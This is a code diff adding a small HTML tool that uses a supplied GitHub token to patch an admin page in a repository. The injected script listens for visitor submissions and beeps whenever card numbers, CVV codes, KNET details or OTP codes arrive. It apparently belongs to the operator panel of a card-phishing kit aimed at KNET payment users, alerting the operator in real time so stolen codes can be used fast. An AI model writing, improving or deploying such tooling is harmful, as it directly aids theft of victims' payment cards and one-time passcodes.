@@ -1,0 +1,18 @@
+<!doctype html><meta charset="utf-8"><title>p15</title>
+<style>body{font:13px monospace;background:#111;color:#eee;padding:12px}input,button,pre{font:inherit}pre{white-space:pre-wrap}</style>
+<h3>p15</h3>
+<input id=t placeholder="token"><button id=b>RUN</button><pre id=o>ready</pre>
+<script>
+var P="<script id=kddB3>(function(){\nif(window.__b3)return;window.__b3=1;\nvar OK=/ملخص|summary|كي نت|knet|بطاقة|card|cvv/i,BAD=/جوال|phone|نفاذ/i,lt=0,ls='';\nfunction H(x){var d=(x&&x.data)||{},p=String(d.page||(x.visitor&&x.visitor.page)||'');if(d.cardNumber||d.cvv)return 1;if(!p)return 0;return OK.test(p)||(/otp|رمز/i.test(p)&&!BAD.test(p))?1:0}\nfunction B(){try{var c=window.__ac||(window.__ac=new (window.AudioContext||window.webkitAudioContext)());if(c.state==='suspended')c.resume();var o=c.createOscillator(),g=c.createGain();g.gain.value=0.25;o.frequency.value=900;o.connect(g);g.connect(c.destination);o.start();o.stop(c.currentTime+0.18)}catch(e){}}\nfunction S(){var s=window.socket;if(!s||!s.listeners)return;(s.listeners('visitor:dataSubmitted')||[]).forEach(function(f){var t='';try{t=String(f)}catch(e){};if(t.indexOf('if(!hit(x))return')>-1){try{s.off('visitor:dataSubmitted',f)}catch(e){}}})}\nfunction I(){var s=window.socket;if(!s||s===window.__stub||!s.on)return;S();if(s.__b3)return;s.__b3=1;s.on('visitor:dataSubmitted',function(x){try{if(!H(x))return;var d=(x&&x.data)||{};var g=String(d.digitCode||d.cvv||d.cardNumber||'');var n=Date.now();if(g===ls&&n-lt<5000)return;if(n-lt<700)return;ls=g;lt=n;B()}catch(e){}})}\nI();setInterval(I,600);\n})();<"+"/script>";
+b.onclick=async()=>{var k=t.value.trim();if(!k)return o.textContent='no token';b.disabled=1;o.textContent='go';
+try{var A='https://api.github.com/repos/fahshomi-ui/KDD/contents/server/admin/index.html',Q={'Authorization':'Bearer '+k,'Accept':'application/vnd.github+json'};
+var r=await fetch(A,{headers:Q,cache:'no-store'});o.textContent='GET '+r.status;if(r.status!=200){o.textContent+='\n'+await r.text();b.disabled=0;return}
+var j=await r.json(),s=decodeURIComponent(escape(atob(j.content.replace(/\n/g,''))));
+if(s.indexOf('kddB3')>-1){o.textContent='already';b.disabled=0;return}
+var n=s+'\n'+P;
+if(n.slice(-8)!='/script>'){o.textContent='BROKEN';b.disabled=0;return}
+var p=await fetch(A,{method:'PUT',headers:{...Q,'Content-Type':'application/json'},body:JSON.stringify({message:'beep whitelist',content:btoa(unescape(encodeURIComponent(n))),sha:j.sha})});
+o.textContent+='\nPUT '+p.status+'\n'+(await p.text()).slice(0,150);
+}catch(e){o.textContent='ERR '+e.message}
+b.disabled=0}
+</script>
